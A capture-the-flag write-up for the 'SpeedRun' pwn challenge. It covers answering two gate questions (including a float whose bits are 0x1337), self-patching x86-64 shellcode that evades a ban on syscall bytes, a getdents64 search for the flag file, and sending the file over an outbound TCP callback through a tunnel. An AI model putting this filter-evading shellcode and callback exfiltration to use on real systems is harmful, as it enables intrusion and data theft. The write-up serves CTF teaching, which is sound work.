# SpeedRun (PWN): Write-up

**Flag:** `nexsec26{Good___morning___or___perhaps___good___evening___everyone!!!}`

The challenge asked us to “please solve it asap so i can sleep peacefully.” We had to answer two questions before the program would let us send shellcode. Getting through the questions was only the first part: the payload also had to avoid a banned instruction and send the flag back through a separate connection.

### 1. Get past the two questions

The service was running at `koala.nexsec.my:35028`. It first asked for a magic number, then asked for “THE magic number.”

The first answer was `nan`. That passed the first check in the recorded solve. We do not have the exact comparison reproduced here, so the confirmed part is the input that worked.

The second answer was:

```text
6.892987146013775e-42
```

This looks random until we treat it as a 32-bit float. Its underlying bits are `0x00001337`, which explains the magic-number hint.

```python
s.sendall(b'nan\n')
s.sendall(b'6.892987146013775e-42\n')
```

After those answers, the service allowed up to 4096 bytes of code.

### 2. Work around the banned syscall bytes

The payload could not contain `0f 05`, the x86-64 encoding of `syscall`. We still needed system calls to open the flag and send it back.

The solution was to send `0f 04` at each syscall site, then change the second byte to `05` after the code started running. This kept the submitted bytes clear of the banned pattern.

```asm
_start:
    lea rbx, [rip+_start]
    lea rcx, [rip+payload_end]
patch_syscalls:
    cmp rbx, rcx
    jae patched
    cmp byte ptr [rbx], 0x0f
    jne nextbyte
    cmp byte ptr [rbx+1], 0x04
    jne nextbyte
    mov byte ptr [rbx+1], 0x05
    inc rbx
nextbyte:
    inc rbx
    jmp patch_syscalls
patched:
    ; continue with the patched syscall sites
```

Before sending the assembled code, the generator checked both restrictions:

```python
assert b'\x0f\x05' not in code
assert len(code) <= 4096
```

### 3. Find the flag file

We did not know the full filename, so the shellcode opened the current directory and used `getdents64` to read its entries. It looked for a name beginning with `flag-`.

The prefix check was:

```asm
lea r8, [rbx+19]
cmp dword ptr [r8], 0x67616c66  ; "flag", little-endian
jne next_dirent
cmp byte ptr [r8+4], 0x2d      ; '-'
jne next_dirent
```

Once it found a match, the payload opened the file and read up to `0x300` bytes.

### 4. Send the contents to a callback listener

The working payload sent the file through an outbound TCP connection. We used a Pinggy TCP tunnel to make the listener reachable from the challenge server.

The public callback address and port were embedded in the shellcode before assembly. They must point to a live listener; an old tunnel address cannot be reused after it closes.

The client then sent a 16-bit little-endian length followed by the shellcode:

```python
s.sendall(struct.pack('<H', len(code)) + code)
```

The recovered client uses Python 3 and GNU Binutils (`as` and `objcopy`) to build the x86-64 payload, so Linux or WSL is suitable.

### 5. Read the result

The successful attempt used a 314-byte payload. The recorded output was:

```text
[+] gate passed. the floor is yours.
[+] Shellcode sent!
[+] Listening for flag callback...

FLAG: nexsec26{Good___morning___or___perhaps___good___evening___everyone!!!}
```

We also checked the recovered code offline: it assembled to 314 bytes for a test callback endpoint, contained no transmitted `0f 05` pattern, and stayed below the size limit. The float conversion also gave `0x1337`. These checks did not involve reconnecting to the challenge service.
